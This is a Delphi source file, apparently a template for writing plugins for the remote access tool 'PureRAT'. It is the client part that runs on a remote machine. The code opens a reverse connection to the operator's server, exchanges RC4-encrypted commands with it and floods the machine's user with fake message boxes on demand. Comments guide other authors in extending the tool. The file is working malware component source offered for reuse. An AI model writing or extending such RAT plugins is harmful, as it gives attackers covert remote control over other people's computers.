{
	This example show you how to create your own plugins for PureRAT.
	Respect everything and follow all comments to be sure that all will work fine. Thank you!
	
	-> wrh1d3
}

library MessageBomber_Client;

uses
  Windows,
  SysUtils,
  SocketUnitEx in '..\Utils\SocketUnitEx.pas',
  UnitRC4 in '..\Utils\UnitRC4.pas';

//Constants for plugin infos
const
  //Kind of plugin you can create for PureRAT
  PluginType: array[0..2] of string = ('Client', 'Builder', 'Server'); //(*)

  //Main plugin infos
  PluginName = 'Message bomber O_O';
  PluginAuthor = 'wrh1d3';
  PluginDescription = 'Display a given number of fake messages';
  PluginVersion = '1.0.0.0';

  //Both server an client must have same plugin id
  PluginId = 'Message bomber O_O - v1.0.0.0';

  //Custom datas encryption password, for sure you must use the same for both server and client parts!
  PluginPassword = '123456';

  //[NOTE]

  {(*) PureRAT use a reverse connection model, so the client is the part
     installed on remote machine, the builder is the client builder on main application and
		 the server the main application itself}

//Plugin variables		
var
  Host: PChar;
  Port: Word;
  PluginCode, ClientId, CmdId, Password: PChar;
  ClientSocket: TClientSocket;
  //these variables are needed to establsh connection to PureRAT server

//Function to retrieve plugin infos
function PluginInfos: PChar; stdcall;
begin
  Result := PChar(PluginName + '|' +
                  PluginAuthor + '|' +
                  PluginDescription + '|' +
                  PluginVersion + '|' +
                  PluginType[0] + '|' + //Specify the plugin type by index (0 -> Client)
                  PluginId + '|');
end;
//-----

//Function to initialize variables
procedure PluginOptions(_Host: PChar; _Port: Word; _PluginCode, _ClientId, _CmdId,
  _Password: PChar); stdcall;
begin
  Host := _Host;
  Port := _Port;
  PluginCode := _PluginCode;
  ClientId := _ClientId;
  CmdId := _CmdId;
  Password := _Password;
end;
//-----

//Our fake message displayer
procedure PluginFakeMessage(Title, Text: PChar);
begin
  MessageBox(0, Text, Title, MB_ICONINFORMATION);
end;
//-----

//Connect to PureRAT server
function PluginConnect: Boolean; //(**)
begin
  ClientSocket := TClientSocket.Create;
  ClientSocket.Connect(Host, Port);
  Result := ClientSocket.Connected;
end;
//-----

//Send encrypted datas to PureRAT server
procedure PluginSendDatas(Datas: string);
begin
  //Please respect following lines sequence!
  Datas := CmdId + '|' + ClientId + '|' + PluginId + '|' + Datas;
  Datas := PluginCode + EnDecryptText(Datas, Password); //You can only send datas with this
  //encryption password, don't change it!!!
  ClientSocket.SendText(Datas);
end;
//-----
   
//Receive encrypted datas from plugin server part
function PluginRecvDatas: string;
begin
  //Please respect following lines sequence!
  Result := ClientSocket.RecvText;
  Result := EnDecryptText(Result, PluginPassword); //Here you can use your custom password
end;
//-----

//Function to be executed
procedure PluginFunction; stdcall; //(***)
var
  Datas, Title, Text: string;
  i, j: Integer;
begin
  if PluginConnect = False then Exit;
  PluginSendDatas(''); //tells PureRAT to load plugin server part, DO NOT MISS IT!!!

  repeat
    Datas := PluginRecvDatas; //(****)
    if Datas = '' then continue; //we don't received anything!

    Title := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));
    Text := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));
    i := StrToInt(Datas);

		//Execute receive command
    for j := 0 to i - 1 do PluginFakeMessage(PChar(Title), PChar(Text));
		
    //send operation feedback to PureRAT server 
		PluginSendDatas('Done!'); //(!)
		
		//[BUG]
		
		{(!) Datas sent to PureRAT server in this loop are not received!!}
		
  until False;

  ClientSocket.Disconnect;
  ClientSocket.Free;
  ClientSocket := nil;
end;
//-----

  //[NOTE]

  {(**) You can use your own method to connect to PureRAT server
   (***) Put function contents in a thread can crash client !!
   (****) You can also send and receive stream from client part}

// Don't edit following lines!!
exports
  PluginInfos,    //Infos about plugin
	PluginOptions,  //Variables initialization
  PluginFunction;	//Function to execute

begin
end.

